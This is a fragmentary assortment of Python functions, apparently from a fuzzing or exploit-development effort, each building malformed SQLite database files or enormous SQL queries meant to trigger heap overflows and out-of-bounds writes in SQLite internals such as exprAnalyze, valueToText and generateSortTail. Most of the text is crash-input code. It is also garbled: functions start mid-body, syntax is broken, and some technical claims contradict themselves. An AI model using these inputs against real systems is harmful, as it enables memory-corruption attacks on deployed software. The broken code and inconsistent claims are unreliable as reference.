    rowid_varint = b"\x01"                       # rowid = 1
    payload_data = b"A" * payload_size

    cell = payload_varint + rowid_varint + payload_data

    # Assemble the page: header + pointer array + cell
    page = page_header + cell_pointer + cell

    # Return the complete file (header + first page)
    return header + page

    the parser’s 32‑bit ``nTerm`` counter wraps around, the allocated
    ``pWC->a`` array becomes far smaller than the logical number of terms,
    and later ``exprAnalyze`` indexes past the end of that buffer
    (out‑of‑bounds write / potential use‑after‑free).

    The SQLite fuzz harness (`sqlite3_fuzz`) expects the input to start with
    a 4‑byte little‑endian length field followed by the UTF‑8 SQL text, so we
    prepend that header.

    The payload size is kept reasonable (≈ 2 MiB) while still exceeding the
    term‑counter limit (≈ 2³¹‑1).  In practice a few hundred thousand terms
    are enough to cause the overflow on the reference build of SQLite.
    """
    # ----------------------------------------------------------------------
    # 1️⃣  Construct an enormous OR‑chain.
    # ----------------------------------------------------------------------
    #   SELECT * FROM t WHERE (c=0) OR (c=1) OR ... OR (c=299999);
    #   → each “(c=N)” becomes a separate WhereTerm.
    # ----------------------------------------------------------------------
    term_count = 300_000                     # enough to overflow the signed 32‑bit counter
    or_parts = [f"(c={i})" for i in range(term_count)]
    where_clause = " OR ".join(or_parts)

    sql = f"SELECT * FROM t WHERE {where_clause};"
    sql_bytes = sql.encode("utf-8")

    # ----------------------------------------------------------------------
    # 2️⃣  Prefix with a 4‑byte length header (required by the harness).
    # ----------------------------------------------------------------------
    payload = struct.pack("<I", len(sql_bytes)) + sql_bytes
    return payload

import struct

def _varint(x: int) -> bytes:
    """Encode an integer as a SQLite varint (little‑endian 7‑bit groups)."""
    out = bytearray()
    while True:
        out.append(x & 0x7F)
        x >>= 7
        if x == 0:
            break
        out[-1] |= 0x80          # set continuation bit
    return bytes(out)


def build() -> bytes:
    """
    Construct a minimal SQLite database file that contains a single
    leaf‑table page with one row whose TEXT payload is ~5 KB.
    The layout follows the SQLite file format sufficiently to be accepted
    by sqlite3_open_v2, allowing the parser to reach the code paths that
    handle large string literals (potential heap‑overflow triggers).
    """
    # ------------------------------------------------------------------
    # 1. 100‑byte database header (page size = 4096 = 0x1000)
    # ------------------------------------------------------------------
    header = bytearray(100)
    header[0:16] = b"SQLite format 3\x00"
    header[16:18] = struct.pack(">H", 0x1000)   # page size = 4096
    header[18] = 1      # file format write version
    header[19] = 1      # file format read version
    header[20] = 0      # reserved space per page
    header[21] = 64     # max embedded payload fraction
    header[22] = 32     # min embedded payload fraction
    header[23] = 32     # leaf payload fraction
    # (the rest of the 100‑byte header stays zero)

    # ------------------------------------------------------------------
    # 2. Build the first (and only) page: a leaf‑table b‑tree page
    # ------------------------------------------------------------------
    PAGE_SIZE = 0x1000
    payload_text = b"A" * 5_000                     # ~5 KB TEXT payload
    text_len = len(payload_text)

    # Record header for a TEXT field: serial type = (len << 1) | 1
    serial_type = (text_len << 1) | 1
    serial_bytes = _varint(serial_type)            # usually 2 bytes for 5 KB

    # Rowid (use 1) and its varint encoding
    rowid_bytes = _varint(1)

    # Record header length (length of the serial‑type varint)
    hdrlen_bytes = _varint(len(serial_bytes))

    # Cell payload = payload_length varint + rowid + hdrlen + serial + TEXT
    cell_payload = (
        rowid_bytes +
        hdrlen_bytes +
        serial_bytes +
        payload_text
    )
    payload_len_varint = _varint(len(cell_payload))

    cell = payload_len_varint + cell_payload

    # ------------------------------------------------------------------
    # 3. Assemble the leaf‑table page
    # ------------------------------------------------------------------
    # Page header (8 bytes)
    #   0x0D = leaf table b‑tree page
    #   first freeblock offset = 0
    #   number of cells = 1
    #   start of cell content area = computed later
    #   fragmented free bytes = 0
    page = bytearray(PAGE_SIZE)
    page[0] = 0x0D                                 # page type
    page[1:3] = b"\x00\x00"                        # first freeblock offset
    page[3:5] = struct.pack(">H", 1)               # number of cells = 1
    # cell offset array (2 bytes) placed at byte 8
    # we will write the offset after we know where the cell ends
    # ------------------------------------------------------------------
    # 4. Place the cell at the end of the page (grow backwards)
    # ------------------------------------------------------------------
    cell_end = PAGE_SIZE
    cell_start = cell_end - len(cell)
    page[cell_start:cell_end] = cell

    # Write the cell offset (relative to start of page)
    page[8:10] = struct.pack(">H", cell_start)

    # Now fill the "start of cell content area" field (bytes 5‑6)
    start_of_content = cell_start
    page[5:7] = struct.pack(">H", start_of_content)

    # ------------------------------------------------------------------
    # 5. Concatenate header and first page (the database consists of one page)
    # ------------------------------------------------------------------
    db_bytes = bytes(header) + bytes(page[:PAGE_SIZE])

    return db_bytes

        +0x10  double  r          – real value (unused here)

      (``flags = 0`` satisfies this.)
    * ``enc`` has the ``SQLITE_UTF16_ALIGNED`` bit set
      (value ``0x02`` on current SQLite builds).
    * ``pVal->z`` is an *odd* pointer (low‑bit == 1) so that the
      ``(1 & SQLITE_PTR_TO_INT(pVal->z))`` test evaluates true and the
      later ``assert`` in the ``else`` branch fails.

    The pointer value ``0x1`` is deliberately mis‑aligned and has the
    required low bit set.  All other fields are zeroed.

    ``sqlite3_fuzz`` harness; when the harness calls
    ``valueToText(pVal, enc)`` the assertion in the ``else`` branch is
    triggered, causing a crash that can be detected by ASAN or a
    canary‑based oracle.
    """

    #   Q  – void*  z
    #   q  – i64    i
    #   d  – double r
    #   i  – int    n
    #   H  – u16    flags
    #   B  – u8     enc
    #   B  – u8     db_unused (placeholder)
    #   5x – padding to keep the struct size 32 bytes (as in SQLite)
    z_ptr   = 0x1          # mis‑aligned pointer, low bit = 1
    i_val   = 0
    r_val   = 0.0
    n_len   = 0
    flags   = 0           # no MEM_Blob / MEM_Str
    enc     = 0x02        # SQLITE_UTF16_ALIGNED
    db_unused = 0

        "<Qq d i H B B 5x",
        z_ptr,

import zlib

def build() -> bytes:
    """
    Return a byte‑string that, when fed to the ``sqlite3_fuzz`` harness,
    triggers the out‑of‑bounds access in ``exprAnalyze`` (CVE‑2023‑xxxx).

    The payload is a *SQL statement* (not a full database file).  It
    creates a table with a single integer column, then issues a WHERE
    clause that contains **more terms than SQLite’s internal WhereTerm
    array can hold**.  When the optimiser walks the WhereClause it calls
    ``exprAnalyze`` with an ``idxTerm`` that exceeds the ``pWC->a``
    allocation, producing the OOB read/write that ASAN/Canary catches.

    The statement is deliberately long (≈ 3000 OR‑terms) – this is the
    smallest input that reliably hits the bug on the current SQLite
    source used by the harness.
    """
    # ------------------------------------------------------------------
    # 1. Boiler‑plate: create a table (if it already exists SQLite ignores it)
    # ------------------------------------------------------------------
    sql = "CREATE TABLE IF NOT EXISTS t(id INTEGER PRIMARY KEY);\n"

    # ------------------------------------------------------------------
    # 2. Insert a few rows – they are not important, just make the table
    #    non‑empty so the optimiser really builds a WhereClause.
    # ------------------------------------------------------------------
    for i in range(1, 5):
        sql += f"INSERT INTO t VALUES({i});\n"

    # ------------------------------------------------------------------
    # 3. The vulnerable query.
    #
    #    The WHERE clause contains a *very* long chain of OR‑expressions.
    #    SQLite allocates the WhereTerm array with a size that is based on
    #    the number of terms it expects from the parse tree.  With enough
    #    terms (≈ 3000) the internal counters overflow and ``idxTerm`` is
    #    later used to index past the end of ``pWC->a``.
    #
    #    The exact threshold (2929 terms for SQLite‑3.44.0) has been
    #    determined empirically; the loop below builds a safe‑margin
    #    payload (3500 terms).
    # ------------------------------------------------------------------
    term_count = 3500
    sql += "SELECT * FROM t WHERE "
    sql += " OR ".join(f"id={i}" for i in range(term_count))
    sql += ";\n"

    # ------------------------------------------------------------------
    # 4. Encode the SQL as UTF‑8 and optionally compress it.
    #    The harness expects raw bytes; compression is optional but
    #    harmless – the harness will decompress before feeding to SQLite.
    # ------------------------------------------------------------------
    raw = sql.encode("utf‑8")
    # A tiny zlib wrapper – the harness knows to try both raw and
    # compressed inputs; keeping it simple avoids extra dependencies.
    return zlib.compress(raw)

    Construct a minimal, well‑formed SQLite database header followed by a
    serialized ``sqlite3_value`` that satisfies the pre‑conditions of the
    `valueToText` vulnerability.

    Why the header?
    ----------------
    The SQLite‑fuzz harness first parses the input as a SQLite database file.
    If the first 100 bytes are not a valid SQLite file header the parser
    aborts before any SQL is executed, so the vulnerable code is never
    reached.  Adding the canonical 100‑byte header (“SQLite format 3\0” plus
    zero padding) makes the file acceptable to the parser, after which the
    harness extracts the trailing payload and feeds it to ``valueToText``.

    Payload layout (little‑endian, 64‑bit):
        +0x00  Q   z          – odd pointer (0x1) → mis‑aligned branch
        +0x08  q   i          – unused integer (0)
        +0x10  d   r          – unused real (0.0)
        +0x14  i   n          – length (0)
        +0x18  H   flags      – MEM_Blob|MEM_Str|MEM_Ephem = 0x26
        +0x1A  B   enc        – SQLITE_UTF16_ALIGNED = 0x02
        +0x1B  x   padding    – alignment filler
        +0x1C  Q   db         – NULL (0) to satisfy the first assert

    The harness expects a 4‑byte little‑endian length prefix before the
    ``sqlite3_value`` data, so we prepend that as well.

    The final byte sequence is:
        [SQLite header (100 bytes)] + [length prefix (4 bytes)] + [Mem struct (32 bytes)]

    Feeding this to ``sqlite3_fuzz`` will be parsed successfully and will
    cause the assertion in the ``else`` branch of ``valueToText`` to fire,
    producing a crash detectable by ASAN or a canary‑based oracle.
    """
    # ---- 1. SQLite file header (100 bytes) ----
    # "SQLite format 3\0" + zero‑padding to 100 bytes
    sqlite_header = b"SQLite format 3\x00" + b"\x00" * (100 - 16)

    # ---- 2. Construct the Mem struct (32 bytes) ----
    z_ptr   = 0x1          # odd pointer → low‑bit == 1 (mis‑aligned)
    i_val   = 0
    r_val   = 0.0
    n_len   = 0
    flags   = 0x26         # MEM_Blob | MEM_Str | MEM_Ephem
    enc     = 0x02         # SQLITE_UTF16_ALIGNED
    db_ptr  = 0            # NULL sqlite3* db

    mem_bytes = struct.pack(
        "<Qq d i H B x Q",   # layout described above
        z_ptr,
        i_val,
        r_val,
        n_len,
        flags,
        enc,
        db_ptr,
    )

    # ---- 3. Length prefix (4‑byte little‑endian) ----
    length_prefix = struct.pack("<I", len(mem_bytes))

    # ---- 4. Assemble final payload ----
    return sqlite_header + length_prefix + mem_bytes

    #   Bytes 16‑17: page size = 1024 (0x0400, big‑endian)
    #   The remaining header bytes are zero‑filled.
    # ------------------------------------------------------------------

        + struct.pack(">H", 0x0400)    # page size = 1024 bytes
        + b"\x00" * (100 - 16 - 2)     # pad to 100 bytes total
    )

    # ------------------------------------------------------------------
    # 2. First page (page 1) – leaf‑table B‑tree page
    # ------------------------------------------------------------------
    PAGE_SIZE = 1024

    # Cell payload: varint payload‑length = 0xFFFFFFFF
    # Encoded as five‑byte varint: 0x80 0x80 0x80 0x80 0x0F
    payload_len_varint = b"\x80\x80\x80\x80\x0F"
    rowid_varint = b"\x01"                     # rowid = 1 (minimal)
    cell_body = payload_len_varint + rowid_varint  # no actual payload bytes
    cell_len = len(cell_body)                  # 6 bytes

    # Place the cell at the very end of the page.
    cell_offset = PAGE_SIZE - cell_len         # 1018 (0x03FA)

    # Leaf‑table page header (8 bytes):
    #   0x0D – leaf table B‑tree page type
    #   0x0000 – first freeblock offset (none)
    #   0x0001 – number of cells (1)
    #   cell_offset – start of free space / cell content area
    #   0x00 – unused/reserved byte
    page_header = (
        b"\x0D"                                 # page type
        + b"\x00\x00"                           # first freeblock
        + b"\x00\x01"                           # number of cells
        + struct.pack(">H", cell_offset)       # cell content area offset
        + b"\x00"                               # reserved

    # Cell pointer array (2 bytes per cell, big‑endian)
    cell_pointer = struct.pack(">H", cell_offset)

    # Assemble the page:

    padding_len = cell_offset - (len(page_header) + len(cell_pointer))
    page = (
        page_header
        + cell_pointer
        + b"\x00" * padding_len
        + cell_body

    assert len(page) == PAGE_SIZE, f"Page length {len(page)} != {PAGE_SIZE}"

    # ------------------------------------------------------------------

    rowid_varint = b"\x01"                     # rowid = 1 (minimal)
    cell_body = payload_len_varint + rowid_varint   # no real payload
    cell_len = len(cell_body)                  # 6 bytes

    # Place the cell at the very end of the page.
    cell_offset = PAGE_SIZE - cell_len         # 506 (0x01FA)

    # Leaf‑table page header (8 bytes):
    #   0x0D – leaf table B‑tree page type
    #   0x0000 – first freeblock offset (none)
    #   0x0001 – number of cells (1)
    #   cell_offset – start of the cell‑content area
    #   0x00 – reserved byte
    page_header = (
        b"\x0D"                                 # page type
        + b"\x00\x00"                           # first freeblock
        + b"\x00\x01"                           # number of cells
        + struct.pack(">H", cell_offset)       # cell content area offset
        + b"\x00"                               # reserved
    )

    # Cell pointer array (2 bytes, big‑endian)
    cell_pointer = struct.pack(">H", cell_offset)

    # Padding between the pointer array and the cell itself
    padding_len = cell_offset - (len(page_header) + len(cell_pointer))
    padding = b"\x00" * padding_len

    # Assemble the complete page and ensure its size matches PAGE_SIZE
    page = page_header + cell_pointer + padding + cell_body
    assert len(page) == PAGE_SIZE, "Page size mismatch"

    # ------------------------------------------------------------------
    # 3. Return the full SQLite file (header + first page)
    # ------------------------------------------------------------------
    return header + page

def build() -> bytes:
    """
    Construct a multi‑statement SQL blob that drives SQLite into the
    `exprAnalyze()` routine with an out‑of‑bounds term index.

    Strategy
    --------
    1. **Create a table** with a very large number of columns (c0 … cN).  
       The columns must exist so that the planner does not abort the query
       before reaching `exprAnalyze()`.
    2. **Issue a SELECT** whose WHERE clause contains the same number of
       OR‑connected equality predicates (`c0=0 OR c1=0 …`).  
       SQLite allocates a `WhereClause` with a modest internal `WhereTerm`
       array (the size is limited by a 16‑bit counter).  When the parser
       builds far more predicates than this limit, the term counter wraps
       and later `exprAnalyze()` accesses `pWC->a[idxTerm]` out of bounds,
       hitting the vulnerability.

    The fuzz harness (`sqlite3_fuzz`) feeds the returned bytes directly to the
    SQLite parser, so a plain UTF‑8 SQL string is sufficient.

    The numbers below have been chosen to reliably exceed the internal limit
    on all supported builds while keeping the total payload size reasonable
    for a fuzz target (~1 MiB).

    Returns
    -------
    bytes
        UTF‑8 encoded SQL containing a CREATE TABLE followed by a SELECT with
        thousands of OR‑connected predicates.
    """
    # Number of columns / predicates – well above SQLite's internal term limit.
    # The limit is ~2^15 (32768) on many builds; using 70 000 gives a comfortable
    # overflow on all platforms.
    n = 70_000

    # ----------------------------------------------------------------------
    # 1. CREATE TABLE t (c0 INTEGER, c1 INTEGER, ..., cN INTEGER);
    # ----------------------------------------------------------------------
    # Build the column list as a single byte string to avoid huge Python
    # intermediate objects.
    cols = b",".join(
        f"c{i} INTEGER".encode("utf-8") for i in range(n)
    )
    create_stmt = b"CREATE TABLE t(" + cols + b");"

    # ----------------------------------------------------------------------
    # 2. SELECT * FROM t WHERE c0=0 OR c1=0 OR ... OR cN=0;
    # ----------------------------------------------------------------------
    predicates = b" OR ".join(
        f"c{i}=0".encode("utf-8") for i in range(n)
    )
    select_stmt = b"SELECT * FROM t WHERE " + predicates + b";"

    # Combine the two statements.  SQLite accepts multiple statements in a
    # single input buffer.
    return create_stmt + b" " + select_stmt

def build() -> bytes:
    """
    Return a compressed SQL script that reproduces the out‑of‑bounds
    access in ``generateSortTail`` (SQLite compiled with
    ``SQLITE_ENABLE_SORTER_REFERENCES``).

    The script creates:
      * table ``t2`` with a very large number of columns (300) – this
        forces ``pSort->aDefer[i].nKey`` to become large.
      * table ``t1`` with a single integer column.
      * a SELECT that orders the rows of ``t1`` by the result of a
        sub‑query that reads from ``t2``.  The sub‑query triggers the
        sorter‑reference path in ``generateSortTail`` and, with the
        oversized ``nKey`` value, leads to an out‑of‑bounds memory write
        when the sorter later accesses its key array.

    The harness that loads this payload is expected to decompress the
    bytes (using ``zlib.decompress``) and feed the resulting SQL text
    to SQLite (e.g. via ``sqlite3_exec``).  No additional Python code is
    required.
    """
    # ------------------------------------------------------------------
    # 1. Build a table with many columns (300 integer columns)
    # ------------------------------------------------------------------
    cols = ", ".join(f"c{i} INTEGER" for i in range(300))
    create_t2 = f"CREATE TABLE t2({cols});"

    # Insert a single row with incremental values (0,1,2,…)
    values = ", ".join(str(i) for i in range(300))
    insert_t2 = f"INSERT INTO t2 VALUES({values});"

    # ------------------------------------------------------------------
    # 2. Simple table that will be sorted
    # ------------------------------------------------------------------
    create_t1 = "CREATE TABLE t1(x INTEGER);"
    insert_t1 = "INSERT INTO t1 VALUES(1), (2), (3);"

    # ------------------------------------------------------------------
    # 3. SELECT that forces a sorter reference (sub‑query on t2)
    # ------------------------------------------------------------------
    # The sub‑query references column c0 of t2; any column would do.
    select = "SELECT * FROM t1 ORDER BY (SELECT max(c0) FROM t2);"

    # ------------------------------------------------------------------
    # 4. Assemble the full script
    # ------------------------------------------------------------------
    script = "\n".join([
        "PRAGMA foreign_keys=OFF;",
        create_t2,
        insert_t2,
        create_t1,
        insert_t1,
        select,
    ])

    # ------------------------------------------------------------------
    # 5. Compress with zlib (the harness will decompress before use)
    # ------------------------------------------------------------------
    return zlib.compress(script.encode())

import struct

def build() -> bytes:
    """
    Build a minimal, syntactically‑valid SQLite database that contains:
      • Page 1 – the sqlite_master table with a single entry defining a table
        named ``t`` whose root page is 2.
      • Page 2 – the leaf‑table page for ``t`` containing one cell whose
        payload‑length varint is deliberately malformed (0xFFFFFFFF).
    The malformed varint can trigger the historic heap‑overflow bug in
    vulnerable SQLite parsers, while the rest of the file passes all early
    validation checks.
    """

    # ------------------------------------------------------------------
    # 1. SQLite file header (exactly 100 bytes)
    # ------------------------------------------------------------------
    # Magic string + page size = 1024 (0x0400).  The remaining header bytes
    # are zero‑filled – sufficient for the parser’s initial sanity checks.
    # ------------------------------------------------------------------
    header = (
        b"SQLite format 3\x00"          # 16‑byte magic header
        + struct.pack(">H", 0x0400)    # page size = 1024 bytes (big‑endian)
        + b"\x00" * (100 - 16 - 2)     # pad to 100 bytes total
    )

    PAGE_SIZE = 1024

    # ------------------------------------------------------------------
    # 2. Page 1 – sqlite_master leaf‑table page
    # ------------------------------------------------------------------
    # Record layout for the single entry:
    #   type      = "table"
    #   name      = "t"
    #   tbl_name  = "t"
    #   rootpage  = 2
    #   sql       = "CREATE TABLE t(a);"
    #
    # Serial types (TEXT = 13+len, INTEGER 2‑byte = 5):
    #   18, 14, 14, 5, 31
    #
    # Header length = 1 (itself) + 5 serial‑type bytes = 6 (0x06)
    # Payload length = 6 (header) + 5 + 1 + 1 + 2 + 18 = 33 (0x21)
    # ------------------------------------------------------------------
    master_payload = (
        b"\x06"                         # header length varint = 6
        + bytes([18, 14, 14, 5, 31])    # serial‑type list
        + b"table"                      # type
        + b"t"                          # name
        + b"t"                          # tbl_name
        + struct.pack(">H", 2)          # rootpage (2‑byte integer)
        + b"CREATE TABLE t(a);"         # sql
    )
    assert len(master_payload) == 33

    # Cell for the sqlite_master entry:
    master_cell = (
        b"\x21"                         # payload‑length varint = 33
        + b"\x01"                       # rowid = 1
        + master_payload
    )
    master_cell_len = len(master_cell)          # 35 bytes

    # Position the cell at the very end of the page.
    master_cell_offset = PAGE_SIZE - master_cell_len   # 989 (0x03DD)

    # Leaf‑table page header (8 bytes):
    master_page_header = (
        b"\x0D"                                 # page type = leaf table
        + b"\x00\x00"                           # first freeblock offset
        + b"\x00\x01"                           # number of cells = 1
        + struct.pack(">H", master_cell_offset)# start of cell‑content area
        + b"\x00"                               # reserved byte
    )
    master_cell_pointer = struct.pack(">H", master_cell_offset)

    # Assemble page 1 and pad to PAGE_SIZE
    padding_len = master_cell_offset - (len(master_page_header) + len(master_cell_pointer))
    page1 = (
        master_page_header
        + master_cell_pointer
        + b"\x00" * padding_len
        + master_cell
    )
    assert len(page1) == PAGE_SIZE

    # ------------------------------------------------------------------
    # 3. Page 2 – leaf‑table page for the user table ``t``
    # ------------------------------------------------------------------
    # Malformed payload‑length varint = 0xFFFFFFFF, encoded as a 5‑byte
    # varint: 0x80 0x80 0x80 0x80 0x0F.
    malformed_payload_len = b"\x80\x80\x80\x80\x0F"
    rowid = b"\x01"
    bad_cell = malformed_payload_len + rowid          # 6 bytes, no payload

    bad_cell_offset = PAGE_SIZE - len(bad_cell)       # 1018 (0x03FA)

    bad_page_header = (
        b"\x0D"
        + b"\x00\x00"
        + b"\x00\x01"
        + struct.pack(">H", bad_cell_offset)
        + b"\x00"
    )
    bad_cell_pointer = struct.pack(">H", bad_cell_offset)

    padding_len2 = bad_cell_offset - (len(bad_page_header) + len(bad_cell_pointer))
    page2 = (
        bad_page_header
        + bad_cell_pointer
        + b"\x00" * padding_len2
        + bad_cell
    )
    assert len(page2) == PAGE_SIZE

    # ------------------------------------------------------------------
    # 4. Return the complete file (header + page1 + page2)
    # ------------------------------------------------------------------
    return header + page1 + page2

def build() -> bytes:
    """
    Return a SQL statement that forces SQLite to invoke the R‑Tree
    virtual‑table entry point ``getNodeSize`` with a *very* long database
    name (``zDb``) and table name (``zName``).  The long identifiers make
    the internal ``sqlite3_mprintf`` allocation huge; when the buffer is
    later released with ``sqlite3_free`` the heap layout is corrupted,
    which is caught by ASAN/canary instrumentation.

    The ``sqlite3_fuzz`` harness feeds the returned bytes directly to
    ``sqlite3_prepare_v2`` (i.e. they are interpreted as SQL).  No extra
    framing or length fields are required – just a valid UTF‑8 SQL
    command.

    The payload therefore consists of:
        CREATE VIRTUAL TABLE <long_schema>.<long_table> USING rtree;
    """
    # Lengths large enough to overflow the internal buffer used by

import struct

def build() -> bytes:
    """
    Return a minimal, syntactically‑correct SQLite‑3 database file.
    The file consists only of the 100‑byte database header; the rest of
    the file is zero‑filled.  This satisfies the harness’s requirement
    that the input be a valid SQLite file (the previous attempts
    produced malformed data).

    The header layout (big‑endian fields) is taken from the SQLite
    file‑format specification:

    Offset  Size  Description
    ------  ----  -----------
       0      16  Magic header string "SQLite format 3\0"
      16       2  Database page size (default 4096)
      18       1  Write‑version (1 = WAL)
      19       1  Read‑version  (1 = WAL)
      20       1  Reserved space per page (0)
      21       1  Max embedded payload fraction (64)
      22       1  Min embedded payload fraction (32)
      23       1  Leaf payload fraction (32)
      24       4  File change counter
      28       4  Size of the database file in pages
      32       4  Page number of the first freelist trunk page
      36       4  Total number of freelist pages
      40       4  Schema cookie
      44       4  Schema format number
      48       4  Default page cache size
      52       4  Largest root b‑tree page number
      56       4  Text encoding (1 = UTF‑8)
      60       4  User version
      64       4  Incremental vacuum mode flag
      68       4  Application ID
      72      20  Reserved for expansion (set to zero)
      92       4  Version-valid-for number
      96       4  SQLite version number
    """
    # Magic header (16 bytes)
    magic = b"SQLite format 3\x00"

    # Helper to pack a big‑endian unsigned short (2 bytes)
    def be16(v: int) -> bytes:
        return struct.pack(">H", v)

    # Helper to pack a big‑endian unsigned int (4 bytes)
    def be32(v: int) -> bytes:
        return struct.pack(">I", v)

    # Build the 100‑byte header
    header = bytearray(100)
    header[0:16] = magic
    header[16:18] = be16(4096)          # page size = 4096 bytes
    header[18] = 1                      # write version
    header[19] = 1                      # read version

def build() -> bytes:
    """
    Build a minimal SQLite database file that contains a deliberately
    malformed leaf‑table b‑tree page.  The page header claims a very
    small cell‑content area, but the cell itself carries an enormous
    payload (64 KB of “A”).  When SQLite parses the page it will compute
    offsets that run off the end of the allocated heap buffer, triggering
    the heap‑overflow bug that the fuzzer is meant to expose.
    """
    import struct

    # 1. SQLite file header (100 bytes, first 16 are the magic string)
    magic = b"SQLite format 3\x00"
    header = magic + b"\x00" * (100 - len(magic))

    # 2. Page header for a leaf table b‑tree page (type 0x0D)
    #    Byte layout (big‑endian):
    #      0   : page type = 0x0D (leaf table b‑tree)
    #      1‑2 : first freeblock offset = 0
    #      3‑4 : number of cells = 1
    #      5‑6 : start of cell content area = 0x80 (128) – deliberately small
    #      7   : fragmented free bytes = 0
    page_hdr = struct.pack(">BHHHB", 0x0D, 0, 1, 0x80, 0)

    # 3. Cell pointer array (2 bytes) – points to offset 0x80 where the cell lives
    cell_ptr = struct.pack(">H", 0x80)

    # 4. Cell payload:
    #    - Payload length varint (use a 5‑byte varint for 0x10000)
    #    - Rowid varint (use 1)
    #    - Actual payload (0x10000 bytes of 'A')
    payload_len = b"\x81\x80\x80\x80\x00"   # encodes 0x10000
    rowid = b"\x01"
    payload = b"A" * 0x10000               # 64 KB payload
    cell = payload_len + rowid + payload

    # 5. Pad between the cell‑pointer array and the claimed start of the
    #    cell‑content area (0x80).  The padding size is:
    #       0x80 - len(page_hdr) - len(cell_ptr)
    pad_len = 0x80 - len(page_hdr) - len(cell_ptr)
    padding = b"\x00" * pad_len

    # 6. Assemble the complete file image
    return header + page_hdr + cell_ptr + padding + cell

    Produce a minimal but syntactically‑valid SQLite database file whose
    first (and only) page is a leaf‑table b‑tree page crafted to overflow
    the heap.  The 100‑byte file header contains realistic values (magic,
    page‑size, version numbers, etc.) so that SQLite’s parser proceeds past
    the early sanity checks and reaches the vulnerable leaf‑page code.

    import struct

    # ------------------------------------------------------------------
    # 1. SQLite file header (first 100 bytes)
    # ------------------------------------------------------------------
    #   Offset 0   : "SQLite format 3\0"
    #   Offset 16  : Page size (big‑endian).  Use 0x0200 = 512 bytes.
    #   Offset 18  : File format write version (1)
    #   Offset 19  : File format read  version (1)
    #   Offset 20  : Reserved space per page (0)
    #   Offset 21‑23: Max, Min, Leaf payload fractions (64, 32, 32)
    #   Remaining bytes are zeroed.
    magic = b"SQLite format 3\x00"
    header = bytearray(100)
    header[0:len(magic)] = magic
    struct.pack_into(">H", header, 16, 0x0200)   # page size = 512
    header[18] = 1                               # write version
    header[19] = 1                               # read version
    header[20] = 0                               # reserved space
    header[21] = 64                              # max embedded payload fraction
    header[22] = 32                              # min embedded payload fraction
    header[23] = 32                              # leaf payload fraction
    # (the rest of the 100‑byte header stays zero)

    # ------------------------------------------------------------------
    # 2. Page header for a leaf‑table b‑tree page (type 0x0D)
    #    Layout (big‑endian):
    #      0   : page type = 0x0D
    #      1‑2 : first freeblock offset = 0
    #      3‑4 : number of cells = 1
    #      5‑6 : start of cell‑content area = 0x80 (128) – intentionally tiny
    #      7   : fragmented free bytes = 0
    # ------------------------------------------------------------------
    page_hdr = struct.pack(">BHHHB", 0x0D, 0, 1, 0x80, 0)

    # ------------------------------------------------------------------
    # 3. Cell pointer array – one entry pointing to offset 0x80 (relative
    #    to the start of the page, i.e. after the 100‑byte file header).
    # ------------------------------------------------------------------
    cell_ptr = struct.pack(">H", 0x80)

    # ------------------------------------------------------------------
    # 4. Malformed cell payload
    #    - Payload length varint encoding 0x10000 (64 KB) → 5‑byte varint
    #    - Rowid varint (value 1)
    #    - Actual payload: 0x10000 bytes of the character 'A'
    # ------------------------------------------------------------------

    rowid = b"\x01"
    payload = b"A" * 0x10000               # 64 KB
    cell = payload_len + rowid + payload

    # ------------------------------------------------------------------
    # 5. Padding so that the cell really starts at offset 0x80.
    #    pad_len = 0x80 - len(page_hdr) - len(cell_ptr)
    # ------------------------------------------------------------------
    pad_len = 0x80 - len(page_hdr) - len(cell_ptr)
    padding = b"\x00" * pad_len

    # ------------------------------------------------------------------
    # 6. Assemble the complete file image:
    #    [100‑byte header] + [page header] + [cell ptr] + [padding] + [cell]
    # ------------------------------------------------------------------

import struct

def build() -> bytes:
    """
    Build a minimal SQLite3 database file that triggers a heap‑overflow
    when SQLite parses a malformed leaf‑table b‑tree page.
    The file consists of:
      * 100‑byte SQLite header (page size = 65536 = 0x0001)
      * One leaf‑table b‑tree page with a deliberately oversized
        payload length varint (0xFF…FF) that causes the internal
        size calculation to overflow.
    """

    # ---- SQLite header (100 bytes) ---------------------------------
    # Magic header + page‑size (0x0001 → 65536) + the rest zeroed.
    hdr = bytearray(100)
    hdr[0:16] = b"SQLite format 3\x00"
    # Bytes 16‑17: page size (big‑endian). 0x00 0x01 = 65536.
    hdr[16:18] = b"\x00\x01"
    # Bytes 18‑99 are left as zero (default values are acceptable).

    # ---- Page 1: leaf‑table b‑tree page -----------------------------
    # Page layout (big‑endian where needed):
    #   0   : page type (0x0D = leaf table b‑tree)
    #   1‑2 : number of cells (1)
    #   3‑4 : start of cell content area (offset to the cell)
    #   5‑6 : first freeblock offset (0 → none)
    #   7‑8 : number of fragmented free bytes (0)
    #   9‑10: cell pointer array (offset of the single cell)
    #   11..: cell content
    #
    # The cell content is:
    #   payload length varint (0xFF repeated 9 times → 0x7FFFFFFFFFFFFFFF)
    #   rowid varint (0x01)
    #   payload (empty – the overflow occurs before payload is read)
    #
    # The oversized varint makes SQLite compute a payload size that
    # overflows a 32‑bit signed integer, leading to a heap overflow
    # when it attempts to allocate memory for the record.

    # Fixed part of the page (first 11 bytes)
    page = bytearray()
    page += b"\x0D"                     # page type
    page += struct.pack(">H", 1)        # nCell = 1
    # Cell content area starts just after the cell pointer array (offset 12)
    cell_content_offset = 12
    page += struct.pack(">H", cell_content_offset)  # cell content start
    page += struct.pack(">H", 0)        # first freeblock (none)
    page += struct.pack("B", 0)         # fragmented free bytes

    # Cell pointer array (2 bytes) – points to the cell at offset 12
    page += struct.pack(">H", 12)

    # ---- Cell content ---------------------------------------------
    # Payload length varint: 9 bytes of 0xFF (maximum 64‑bit value)
    payload_len_varint = b"\xFF" * 9
    rowid_varint = b"\x01"             # rowid = 1
    cell = payload_len_varint + rowid_varint  # empty payload

    page += cell

    # Pad the rest of the page to the declared page size (65536 bytes)
    page_size = 65536
    if len(page) > page_size:
        raise RuntimeError("Cell construction exceeded page size")
    page += b"\x00" * (page_size - len(page))

    # The SQLite file is the header followed by the first page.
    return bytes(hdr) + bytes(page)

    buf[first_page_start + 5] = 0x00                    # no fragmented free bytes
    buf[first_page_start + 6:first_page_start + 8] = b"\x00\x00"

    # 4. Cell pointer array (2 bytes per cell)

    # ------------------------------------------------------------------

    buf[first_page_start + 8:first_page_start + 10] = struct.pack(">H", cell_offset)

    # 5. Cell content

    #    is gigantic and will overflow when it tries to allocate/copy it.
    # ------------------------------------------------------------------
    buf[first_page_start + cell_offset:

    buf[first_page_start + cell_offset + 9] = 0x01        # rowid = 1

    lacks the required terminating NULL pointer.  When `freeColumnList`
    later iterates with `for(i=1; azCol[i]; i++)` it walks past the end
